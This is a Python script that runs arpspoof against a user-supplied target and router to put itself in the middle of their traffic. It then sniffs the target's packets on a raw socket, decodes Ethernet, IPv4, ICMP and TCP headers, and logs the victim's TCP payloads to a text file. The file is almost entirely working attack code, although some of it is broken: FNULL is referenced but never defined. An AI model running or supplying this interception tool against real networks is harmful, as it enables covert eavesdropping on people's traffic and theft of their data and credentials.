import struct
import textwrap
import socket
import subprocess
import sys
import ipaddress
import impacket
import codecs
import signal
import time

TAB_1 = '\t -  '
TAB_2 = '\t\t -  '
TAB_3 = '\t\t\t -  '
TAB_4 = '\t\t\t\t -  '

DATA_TAB_1 = '\t '
DATA_TAB_2 = '\t\t '
DATA_TAB_3 = '\t\t\t '
DATA_TAB_4 = '\t\t\t\t '


def main():
    device_select = subprocess.check_output("ifconfig")
    device_select = str(device_select)
    device_select = device_select[2:len(device_select) - 1]
    device_select = device_select.strip().split(r"\n\n")

    device_arr = []
    for i in range(len(device_select)):
        device_arr.append(device_select[i].split(': ')[0])
        print(device_arr[i])

    selected_device = None
    while selected_device not in range(1, len(device_arr)):
        print("please select the network device you'd like to use: \n")
        for i in range(len(device_arr) - 1):
            print('{}) {}'.format(i + 1, device_arr[i]))

        selected_device = int(input("device: "))

        if selected_device not in range(1, len(device_arr)):
            print('that is not a valid number, please select a number between 1 and {}'.format(len(device_arr)))
        else:
            print('you selected device: {}'.format(device_arr[selected_device - 1]))

    target = input("enter target ip address: ")
    router = input("enter router ip address: ")

    sniff_output(device_arr[selected_device - 1], target, router)


def sniff_output(dev, targ, rout):
    subprocess.Popen('sudo arpspoof -i {} -t {} -r {} '.format(dev, ipaddress.ip_address(targ), ipaddress.ip_address(rout)), shell=True, stdout=FNULL)
    conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))

    # open a (new) file to write
    outF = open("tcp_packets.txt", "w", encoding='ascii')

    try:
        while True:
            raw_data, addr = conn.recvfrom(65536)
            dest_mac, src_mac, eth_proto, data = ethernet_frame(raw_data)

            print('\nEthernet Frame:')
            print(TAB_1 + 'Destination: {}, Source: {}, Protocol: {}'.format(dest_mac, src_mac, eth_proto))

            if eth_proto == 8:
                (version, header_length, ttl, proto, src, target, data) = ipv4_packet(data)

                if src == str(targ) or target == str(targ):
                    print(TAB_1 + 'IPv4 Packet: ')
                    print(TAB_2 + 'Version: {}, Header Length: {}, Time to Live: {}'.format(version, header_length, ttl))
                    print(TAB_2 + 'Protocol: {}, Source: {}, Target: {}'.format(proto, src, target))

                    try:
                        print(TAB_2 + 'Target hostname: {}'.format(socket.gethostbyaddr(target)))
                    except socket.error:
                        pass

                    # 1 for ICMP
                    if proto == 1:
                        icmp_type, code, checksum, data = icmp_packet(data)
                        print(TAB_1 + 'ICMP Packet: ')
                        print(TAB_2 + 'Type: {}, Code: {}, Checksum: {}'.format(icmp_type, code, checksum))

                    # for TCP
                    elif proto == 6:
                        src_port, dest_port, sequence, acknowledgement, flag_urg, flag_ack, flag_psh, flag_rst, flag_syn, flag_fin, data, offset = tcp_packet(data)
                        print(TAB_1 + 'TCP Packet: ')
                        print(TAB_2 + 'Source Port: {}, Destination Port: {}. Sequence: {}, Acknowledgement: {}'.format(src_port, dest_port, sequence, acknowledgement))
                        print(TAB_2 + 'Flags: ')
                        print(TAB_3 + 'URG: {}, ACK: {}, PSH: {}, RST: {}, SYN: {}, FIN: {}'.format(flag_urg, flag_ack, flag_psh, flag_rst, flag_syn, flag_fin))
                        print(TAB_2 + 'Data: ')

                        data_hex = format_hex(data)
                        data_hex = data_hex.encode()
                        data_hex = data_hex.decode('unicode-escape').encode('ascii', 'ignore')
                        data_hex = data_hex.decode('ascii', 'ignore')
                        print(data_hex)

                        if outF.tell() < (1024*1024):
                            formatted = data_hex
                            formatted = '\n\t\t'.join(formatted.splitlines())
                            print(' Ethernet Frame:', file=outF)
                            print('     Destination: {}, Source: {}, Protocol: {}'.format(dest_mac, src_mac, eth_proto), file=outF)
                            print('     IPv4 Packet: ', file=outF)
                            print('         Version: {}, Header Length: {}, Time to Live: {}'.format(version, header_length, ttl), file=outF)
                            print('         Protocol: {}, Source: {}, Target: {}'.format(proto, src, target), file=outF)
                            print('         TCP Packet: ', file=outF)
                            print('             Source Port: {}, Destination Port: {}. Sequence: {}, Acknowledgement: {}'.format(src_port, dest_port, sequence, acknowledgement), file=outF)
                            print('             URG: {}, ACK: {}, PSH: {}, RST: {}, SYN: {}, FIN: {}'.format(flag_urg, flag_ack, flag_psh, flag_rst, flag_syn, flag_fin), file=outF)
                            print('             DATA:\n\t\t{}\n'.format(formatted), file=outF)

    except KeyboardInterrupt:
        print('Keyboard interrupt caught')
        outF.close()
        exit()


def ethernet_frame(data):
    dest_mac, src_mac, proto = struct.unpack('! 6s 6s H', data[:14])
    return get_mac_addr(dest_mac), get_mac_addr(src_mac), socket.htons(proto), data[14:]


def get_mac_addr(bytes_addr):
    # print('bytes address: {}'.format(bytes_addr))
    bytes_str = map('{:02x}'.format, bytes_addr)
    return ':'.join(bytes_str).upper()


def ipv4_packet(data):
    # this stuff is the very first byte, but by itself it's not very useful, because the first
    # byte is version AND header length, gotta extract the version out of here
    # how to extract version out? --> see bitwise operator tutorial, bitshift to the right by 4 bits
    version_header_length = data[0]
    version = version_header_length >> 4

    # the IHL is the length of the internet header in 32 bit words
    # 32 bits = 4 bytes, thus to get the total number of bytes in the IHL,
    # we multiply the unpacked header length by 4, the data starts after that
    header_length = (version_header_length & 15) * 4

    # the data is formatted like '! 8x B B  2X 4s 4s', and is 20 bytes long (see image)
    ttl, proto, src, target = struct.unpack('! 8x B B 2x 4s 4s', data[:20])
    return version, header_length, ttl, proto, ipv4(src), ipv4(target), data[header_length:]


def ipv4(addr):
    return '.'.join(map(str, addr))


# unpacks ICMP packet (internet control message protocol), useful when diagnosing problem with network
def icmp_packet(data):
    icmp_type, code, checksum = struct.unpack('! B B H', data[:4])
    return icmp_type, code, checksum, data[4:]


def tcp_packet(data):
    (src_port, dest_port, sequence, acknowledgement, offset_reserved_flags) = struct.unpack('! H H L L H', data[:14])
    offset = (offset_reserved_flags >> 12) * 4
    flag_urg = (offset_reserved_flags & 32) >> 5
    flag_ack = (offset_reserved_flags & 16) >> 4
    flag_psh = (offset_reserved_flags & 8) >> 3
    flag_rst = (offset_reserved_flags & 4) >> 2
    flag_syn = (offset_reserved_flags & 2) >> 1
    flag_fin = offset_reserved_flags & 1
    return src_port, dest_port, sequence, acknowledgement, flag_urg, flag_ack, flag_psh, flag_rst, flag_syn, flag_fin, data[
                                                                                                                       offset:], offset


def udp_segment(data):
    src_port, dest_port, size = struct.unpack('! H H 2x H', data[:8])
    return src_port, dest_port, size, data[8:]


# whenever we find a long line of data, this makes it more readable
def format_multi_line(prefix, string, size=80):
    size -= len(prefix)
    if isinstance(string, bytes):
        string = ''.join(r'\x{:02x}'.format(byte) for byte in string)
        if size % 2:
            size -= 1
    return '\n'.join([prefix + line for line in textwrap.wrap(string, size)])


def format_hex(string):
    if isinstance(string, bytes):
        string = ''.join(r'\x{:02x}'.format(byte) for byte in string)
    return string


main()
